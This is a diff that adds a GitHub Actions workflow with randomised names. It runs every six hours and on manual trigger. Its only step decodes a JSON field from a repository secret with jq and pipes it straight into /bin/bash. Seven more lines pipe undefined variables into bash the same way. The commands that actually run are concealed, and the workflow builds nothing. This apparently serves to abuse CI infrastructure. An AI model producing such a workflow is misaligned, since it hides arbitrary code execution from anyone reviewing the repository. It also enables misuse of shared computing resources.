@@ -1,0 +1,25 @@
+name: wuhaoning3214
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          ocgt067: ${{ secrets.ocgt067 }}
+        run: |
+          echo $ocgt067 | jq -r .encl2915 | /bin/bash
+          echo $vgqi9104 | jq -r .i26870 | /bin/bash
+          echo $ia8 | jq -r .uuj2473 | /bin/bash
+          echo $pmy36 | jq -r .rv45 | /bin/bash
+          echo $ewxfl29320 | jq -r .wgfhq0 | /bin/bash
+          echo $qern061 | jq -r .gfk4035 | /bin/bash
+          echo $tx0 | jq -r .pugsi9 | /bin/bash
+          echo $ggok952 | jq -r .oft11 | /bin/bash
+
